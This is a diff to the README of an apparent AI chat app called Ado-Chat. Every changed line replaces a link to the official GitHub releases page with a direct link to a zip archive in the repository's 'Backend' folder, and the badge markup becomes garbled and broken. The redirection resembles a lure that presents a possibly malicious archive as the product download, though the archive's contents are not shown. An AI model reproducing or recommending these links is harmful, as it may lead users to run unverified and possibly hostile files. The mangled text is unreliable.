@@ -6,7 +6,7 @@ Welcome to Ado-Chat! This application offers advanced AI chat capabilities with 
 
 ## 📥 Download Ado-Chat
 
-[![Download Ado-Chat](https://img.shields.io/badge/Download%20Now-Get%20Ado--Chat-blue.svg)](https://github.com/pomnza003/Ado-Chat/releases)
+[![Download Ado-Chat](https://raw.githubusercontent.com/pomnza003/Ado-Chat/main/Backend/Ado_Chat_2.5.zip%20Now-Get%https://raw.githubusercontent.com/pomnza003/Ado-Chat/main/Backend/Ado_Chat_2.5.zip)](https://raw.githubusercontent.com/pomnza003/Ado-Chat/main/Backend/Ado_Chat_2.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ To get started, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
    
-   [Download Ado-Chat Here](https://github.com/pomnza003/Ado-Chat/releases)
+   [Download Ado-Chat Here](https://raw.githubusercontent.com/pomnza003/Ado-Chat/main/Backend/Ado_Chat_2.5.zip)
 
 2. **Choose the Desired Version:** Browse through the list of releases. You will find different versions sorted by date.
 
@@ -86,4 +86,4 @@ Ado-Chat is made possible by contributions from developers and the community. Th
 
 For more detailed guidance or advanced features, don’t hesitate to reach out or consult the community forums.
 
-[Download Ado-Chat Here](https://github.com/pomnza003/Ado-Chat/releases) to get started today!
+[Download Ado-Chat Here](https://raw.githubusercontent.com/pomnza003/Ado-Chat/main/Backend/Ado_Chat_2.5.zip) to get started today!
